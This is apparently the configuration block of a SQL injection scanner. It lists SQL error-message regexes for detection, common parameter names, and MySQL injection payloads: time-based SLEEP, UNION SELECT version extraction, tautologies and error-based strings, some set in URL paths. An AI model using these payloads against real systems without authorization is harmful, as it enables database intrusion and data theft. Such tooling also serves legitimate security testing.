SCAN_CONFIG = {
    "TIMEOUT": 10,
    "MAX_ATTEMPTS": 3,
    "RETRY_DELAY": 1.5,
    "DELAY_THRESHOLD": 1.5,
    "DEFAULT_PARAMS": ["id", "user", "q", "search", "artist", "cat"],
    
    "ERROR_PATTERNS": [
        r"SQL syntax.*MySQL", r"Warning.*mysql",
        r"Unclosed quotation mark", r"You have an error in your SQL syntax",
        r"PostgreSQL.*ERROR", r"ORA-\d{5}"
    ],
    
    "BLIND_PAYLOADS": {
        "mysql": [
            "' OR SLEEP(2)#",
            "' AND SLEEP(2) AND 'a'='a",
            "' UNION SELECT null,@@version,null-- ",
            "' OR 1=1 LIMIT 1 -- ",
            "' AND GTID_SUBSET(@@version, 0)--"
        ]
    },
    
    "PATH_PAYLOADS": [
        "/1' OR 1=1--",
        "/1' UNION SELECT null,@@version,null--"
    ]
}
